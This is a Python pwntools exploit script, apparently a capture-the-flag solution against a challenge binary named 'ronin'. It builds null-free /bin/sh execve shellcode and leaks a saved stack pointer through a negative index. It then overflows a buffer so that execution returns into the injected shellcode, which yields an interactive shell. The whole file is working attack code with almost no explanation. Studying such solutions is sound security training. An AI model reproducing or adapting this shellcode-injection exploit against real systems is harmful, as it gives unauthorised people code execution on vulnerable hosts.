from pwn import *

if __name__ == '__main__':
    elf = context.binary = ELF('./ronin')

    io = process()

    # io = remote('pwn.chall.pwnoh.io', 13371)
    io.recvuntil(b'What will you do? ')

    # /bin/sh execve shellcode with no null-terminators
    payload = asm(
        "mov rcx, 0x1168732f6e69622f;"
        "shl rcx, 0x08;"
        "shr rcx, 0x08;"
        "push rcx;"
        "lea rdi, [rsp];"
        "xor rdx, rdx;"
        "xor rsi, rsi;"
        "mov al, 0x3b;"
        "syscall;"
    )

    print(payload)

    io.sendline(b'Chase after it.' + b'\x90' * 16 + payload)

    io.recvuntil(b'Which way will you look? ')

    # Leak stack data by providing a negative offset
    io.sendline(b'-4')

    saved_rbp = u64(io.recvn(6) + b'\x00\x00')
    print(f'Leaked RBP: {saved_rbp}')

    io.sendline(b'2')

    io.recvuntil(b"Tell me a joke.")

    io.sendline(b'A' * 40 + p64(saved_rbp - 50))

    io.interactive()
